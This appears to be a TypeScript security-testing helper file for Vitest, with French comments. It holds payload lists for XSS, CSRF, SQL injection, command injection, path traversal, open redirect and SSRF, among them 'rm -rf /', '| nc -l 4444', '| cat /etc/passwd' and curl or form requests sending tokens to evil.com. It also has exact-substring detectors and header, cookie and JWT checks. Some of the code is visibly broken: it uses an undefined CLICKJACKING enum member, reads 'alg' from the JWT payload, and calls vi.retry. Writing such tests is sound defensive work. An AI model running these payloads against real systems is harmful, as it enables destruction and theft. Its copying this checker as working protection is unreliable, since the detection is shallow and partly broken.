import { vi } from 'vitest';

// Configuration des tests de sécurité
export const securityTestConfig = {
  timeout: 30000,
  retries: 1,
  setupFilesAfterEnv: ['<rootDir>/src/test/security/setup.ts'],
  testEnvironment: 'node',
  testMatch: ['**/*.security.test.ts', '**/*.security.spec.ts'],
};

// Types de vulnérabilités
export enum VulnerabilityType {
  XSS = 'XSS',
  CSRF = 'CSRF',
  SQL_INJECTION = 'SQL_INJECTION',
  COMMAND_INJECTION = 'COMMAND_INJECTION',
  PATH_TRAVERSAL = 'PATH_TRAVERSAL',
  OPEN_REDIRECT = 'OPEN_REDIRECT',
  SSRF = 'SSRF',
  XXE = 'XXE',
  DESERIALIZATION = 'DESERIALIZATION',
  BUFFER_OVERFLOW = 'BUFFER_OVERFLOW',
  RACE_CONDITION = 'RACE_CONDITION',
  PRIVILEGE_ESCALATION = 'PRIVILEGE_ESCALATION',
  INFORMATION_DISCLOSURE = 'INFORMATION_DISCLOSURE',
  AUTHENTICATION_BYPASS = 'AUTHENTICATION_BYPASS',
  AUTHORIZATION_BYPASS = 'AUTHORIZATION_BYPASS',
  SESSION_HIJACKING = 'SESSION_HIJACKING',
  MAN_IN_THE_MIDDLE = 'MAN_IN_THE_MIDDLE',
  DENIAL_OF_SERVICE = 'DENIAL_OF_SERVICE',
  INSECURE_DESIGN = 'INSECURE_DESIGN',
  SECURITY_MISCONFIGURATION = 'SECURITY_MISCONFIGURATION',
  VULNERABLE_DEPENDENCIES = 'VULNERABLE_DEPENDENCIES',
}

// Niveaux de sévérité
export enum SeverityLevel {
  LOW = 'LOW',
  MEDIUM = 'MEDIUM',
  HIGH = 'HIGH',
  CRITICAL = 'CRITICAL',
}

// Interface pour les vulnérabilités
export interface Vulnerability {
  type: VulnerabilityType;
  severity: SeverityLevel;
  description: string;
  cwe?: string;
  cvss?: number;
  remediation?: string;
  detected: boolean;
  falsePositive: boolean;
}

// Payloads de test pour XSS
export const xssPayloads = [
  '<script>alert("XSS")</script>',
  'javascript:alert("XSS")',
  '<img src="x" onerror="alert(\'XSS\')">',
  '<svg onload="alert(\'XSS\')">',
  '"><script>alert("XSS")</script>',
  '"><img src="x" onerror="alert(\'XSS\')">',
  'javascript:alert(String.fromCharCode(88,83,83))',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<object data="javascript:alert(\'XSS\')"></object>',
  '<embed src="javascript:alert(\'XSS\')">',
];

// Payloads de test pour CSRF
export const csrfPayloads = [
  '<form action="http://evil.com/steal" method="POST"><input type="hidden" name="token" value="stolen"></form><script>document.forms[0].submit()</script>',
  '<img src="http://evil.com/steal?token=stolen" style="display:none">',
  '<iframe src="http://evil.com/steal?token=stolen" style="display:none"></iframe>',
];

// Payloads de test pour SQL Injection
export const sqlInjectionPayloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users--",
  "' OR '1'='1' LIMIT 1--",
  "admin'--",
  "admin'/*",
  "' OR '1'='1' #",
];

// Payloads de test pour Command Injection
export const commandInjectionPayloads = [
  '; ls -la',
  '| cat /etc/passwd',
  '&& whoami',
  '; rm -rf /',
  '| nc -l 4444',
  '; curl http://evil.com/steal',
];

// Payloads de test pour Path Traversal
export const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  '....//....//....//etc/passwd',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
];

// Payloads de test pour Open Redirect
export const openRedirectPayloads = [
  'http://evil.com/steal',
  '//evil.com/steal',
  'javascript:window.location="http://evil.com/steal"',
  'data:text/html,<script>window.location="http://evil.com/steal"</script>',
  '//evil.com%2Fsteal',
];

// Payloads de test pour SSRF
export const ssrfPayloads = [
  'http://localhost:22',
  'http://127.0.0.1:3306',
  'http://169.254.169.254/latest/meta-data/',
  'file:///etc/passwd',
  'dict://localhost:11211/stat',
  'ftp://localhost:21',
];

// Utilitaires pour les tests de sécurité
export const testXSS = (input: string): boolean => {
  return xssPayloads.some(payload => 
    input.toLowerCase().includes(payload.toLowerCase())
  );
};

export const testCSRF = (input: string): boolean => {
  return csrfPayloads.some(payload => 
    input.toLowerCase().includes(payload.toLowerCase())
  );
};

export const testSQLInjection = (input: string): boolean => {
  return sqlInjectionPayloads.some(payload => 
    input.toLowerCase().includes(payload.toLowerCase())
  );
};

export const testCommandInjection = (input: string): boolean => {
  return commandInjectionPayloads.some(payload => 
    input.toLowerCase().includes(payload.toLowerCase())
  );
};

export const testPathTraversal = (input: string): boolean => {
  return pathTraversalPayloads.some(payload => 
    input.toLowerCase().includes(payload.toLowerCase())
  );
};

export const testOpenRedirect = (input: string): boolean => {
  return openRedirectPayloads.some(payload => 
    input.toLowerCase().includes(payload.toLowerCase())
  );
};

export const testSSRF = (input: string): boolean => {
  return ssrfPayloads.some(payload => 
    input.toLowerCase().includes(payload.toLowerCase())
  );
};

// Test de validation des entrées
export const testInputValidation = (input: string): Vulnerability[] => {
  const vulnerabilities: Vulnerability[] = [];
  
  if (testXSS(input)) {
    vulnerabilities.push({
      type: VulnerabilityType.XSS,
      severity: SeverityLevel.HIGH,
      description: 'Cross-Site Scripting (XSS) detected',
      cwe: 'CWE-79',
      cvss: 6.1,
      remediation: 'Validate and sanitize all user inputs, use Content Security Policy',
      detected: true,
      falsePositive: false,
    });
  }
  
  if (testSQLInjection(input)) {
    vulnerabilities.push({
      type: VulnerabilityType.SQL_INJECTION,
      severity: SeverityLevel.CRITICAL,
      description: 'SQL Injection detected',
      cwe: 'CWE-89',
      cvss: 9.8,
      remediation: 'Use parameterized queries, input validation, and least privilege',
      detected: true,
      falsePositive: false,
    });
  }
  
  if (testCommandInjection(input)) {
    vulnerabilities.push({
      type: VulnerabilityType.COMMAND_INJECTION,
      severity: SeverityLevel.CRITICAL,
      description: 'Command Injection detected',
      cwe: 'CWE-78',
      cvss: 9.8,
      remediation: 'Avoid command execution, use APIs instead, validate inputs',
      detected: true,
      falsePositive: false,
    });
  }
  
  if (testPathTraversal(input)) {
    vulnerabilities.push({
      type: VulnerabilityType.PATH_TRAVERSAL,
      severity: SeverityLevel.HIGH,
      description: 'Path Traversal detected',
      cwe: 'CWE-22',
      cvss: 7.5,
      remediation: 'Validate file paths, use whitelist approach, chroot jail',
      detected: true,
      falsePositive: false,
    });
  }
  
  if (testOpenRedirect(input)) {
    vulnerabilities.push({
      type: VulnerabilityType.OPEN_REDIRECT,
      severity: SeverityLevel.MEDIUM,
      description: 'Open Redirect detected',
      cwe: 'CWE-601',
      cvss: 6.1,
      remediation: 'Validate redirect URLs, use whitelist approach',
      detected: true,
      falsePositive: false,
    });
  }
  
  if (testSSRF(input)) {
    vulnerabilities.push({
      type: VulnerabilityType.SSRF,
      severity: SeverityLevel.HIGH,
      description: 'Server-Side Request Forgery detected',
      cwe: 'CWE-918',
      cvss: 7.5,
      remediation: 'Validate URLs, use whitelist, implement network segmentation',
      detected: true,
      falsePositive: false,
    });
  }
  
  return vulnerabilities;
};

// Test de validation des en-têtes HTTP
export const testHTTPHeaders = (headers: Record<string, string>): Vulnerability[] => {
  const vulnerabilities: Vulnerability[] = [];
  
  // Test de Content Security Policy
  if (!headers['content-security-policy']) {
    vulnerabilities.push({
      type: VulnerabilityType.SECURITY_MISCONFIGURATION,
      severity: SeverityLevel.MEDIUM,
      description: 'Missing Content Security Policy header',
      cwe: 'CWE-693',
      cvss: 5.3,
      remediation: 'Implement CSP header with appropriate directives',
      detected: true,
      falsePositive: false,
    });
  }
  
  // Test de X-Frame-Options
  if (!headers['x-frame-options']) {
    vulnerabilities.push({
      type: VulnerabilityType.CLICKJACKING,
      severity: SeverityLevel.MEDIUM,
      description: 'Missing X-Frame-Options header',
      cwe: 'CWE-1021',
      cvss: 5.3,
      remediation: 'Set X-Frame-Options to DENY or SAMEORIGIN',
      detected: true,
      falsePositive: false,
    });
  }
  
  // Test de X-Content-Type-Options
  if (!headers['x-content-type-options'] || headers['x-content-type-options'] !== 'nosniff') {
    vulnerabilities.push({
      type: VulnerabilityType.INFORMATION_DISCLOSURE,
      severity: SeverityLevel.LOW,
      description: 'Missing or incorrect X-Content-Type-Options header',
      cwe: 'CWE-116',
      cvss: 3.1,
      remediation: 'Set X-Content-Type-Options to nosniff',
      detected: true,
      falsePositive: false,
    });
  }
  
  // Test de X-XSS-Protection
  if (!headers['x-xss-protection'] || headers['x-xss-protection'] !== '1; mode=block') {
    vulnerabilities.push({
      type: VulnerabilityType.XSS,
      severity: SeverityLevel.LOW,
      description: 'Missing or incorrect X-XSS-Protection header',
      cwe: 'CWE-79',
      cvss: 3.1,
      remediation: 'Set X-XSS-Protection to 1; mode=block',
      detected: true,
      falsePositive: false,
    });
  }
  
  // Test de Strict-Transport-Security
  if (!headers['strict-transport-security']) {
    vulnerabilities.push({
      type: VulnerabilityType.MAN_IN_THE_MIDDLE,
      severity: SeverityLevel.MEDIUM,
      description: 'Missing Strict-Transport-Security header',
      cwe: 'CWE-319',
      cvss: 5.3,
      remediation: 'Implement HSTS header with appropriate max-age',
      detected: true,
      falsePositive: false,
    });
  }
  
  return vulnerabilities;
};

// Test de validation des cookies
export const testCookies = (cookies: string[]): Vulnerability[] => {
  const vulnerabilities: Vulnerability[] = [];
  
  cookies.forEach(cookie => {
    // Test de flag HttpOnly
    if (!cookie.includes('HttpOnly')) {
      vulnerabilities.push({
        type: VulnerabilityType.XSS,
        severity: SeverityLevel.MEDIUM,
        description: 'Cookie missing HttpOnly flag',
        cwe: 'CWE-79',
        cvss: 5.3,
        remediation: 'Set HttpOnly flag for sensitive cookies',
        detected: true,
        falsePositive: false,
      });
    }
    
    // Test de flag Secure
    if (!cookie.includes('Secure')) {
      vulnerabilities.push({
        type: VulnerabilityType.MAN_IN_THE_MIDDLE,
        severity: SeverityLevel.MEDIUM,
        description: 'Cookie missing Secure flag',
        cwe: 'CWE-319',
        cvss: 5.3,
        remediation: 'Set Secure flag for cookies transmitted over HTTPS',
        detected: true,
        falsePositive: false,
      });
    }
    
    // Test de flag SameSite
    if (!cookie.includes('SameSite')) {
      vulnerabilities.push({
        type: VulnerabilityType.CSRF,
        severity: SeverityLevel.MEDIUM,
        description: 'Cookie missing SameSite flag',
        cwe: 'CWE-352',
        cvss: 5.3,
        remediation: 'Set SameSite flag to Strict or Lax',
        detected: true,
        falsePositive: false,
      });
    }
  });
  
  return vulnerabilities;
};

// Test de validation des tokens JWT
export const testJWT = (token: string): Vulnerability[] => {
  const vulnerabilities: Vulnerability[] = [];
  
  try {
    // Décodage du token (sans vérification de signature)
    const parts = token.split('.');
    if (parts.length !== 3) {
      vulnerabilities.push({
        type: VulnerabilityType.INSECURE_DESIGN,
        severity: SeverityLevel.HIGH,
        description: 'Invalid JWT format',
        cwe: 'CWE-345',
        cvss: 7.5,
        remediation: 'Ensure JWT follows proper format',
        detected: true,
        falsePositive: false,
      });
      return vulnerabilities;
    }
    
    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    
    // Test de l'expiration
    if (payload.exp && payload.exp < Date.now() / 1000) {
      vulnerabilities.push({
        type: VulnerabilityType.AUTHENTICATION_BYPASS,
        severity: SeverityLevel.HIGH,
        description: 'JWT token expired',
        cwe: 'CWE-287',
        cvss: 7.5,
        remediation: 'Implement proper token expiration handling',
        detected: true,
        falsePositive: false,
      });
    }
    
    // Test de l'algorithme
    if (payload.alg === 'none') {
      vulnerabilities.push({
        type: VulnerabilityType.AUTHENTICATION_BYPASS,
        severity: SeverityLevel.CRITICAL,
        description: 'JWT using none algorithm',
        cwe: 'CWE-345',
        cvss: 9.8,
        remediation: 'Use strong signing algorithms (RS256, HS256)',
        detected: true,
        falsePositive: false,
      });
    }
    
  } catch (error) {
    vulnerabilities.push({
      type: VulnerabilityType.INSECURE_DESIGN,
      severity: SeverityLevel.HIGH,
      description: 'Invalid JWT token',
      cwe: 'CWE-345',
      cvss: 7.5,
      remediation: 'Validate JWT format and structure',
      detected: true,
      falsePositive: false,
    });
  }
  
  return vulnerabilities;
};

// Configuration des tests de sécurité
export const setupSecurityTest = () => {
  // Configuration des timeouts
  vi.setConfig({
    testTimeout: 30000,
    hookTimeout: 10000,
  });
  
  // Configuration des retries
  vi.retry(1);
  
  // Mock des fonctions sensibles
  vi.mock('crypto', () => ({
    randomBytes: vi.fn(() => Buffer.from('mock-random-bytes')),
    createHash: vi.fn(() => ({
      update: vi.fn().mockReturnThis(),
      digest: vi.fn(() => 'mock-hash'),
    })),
  }));
};
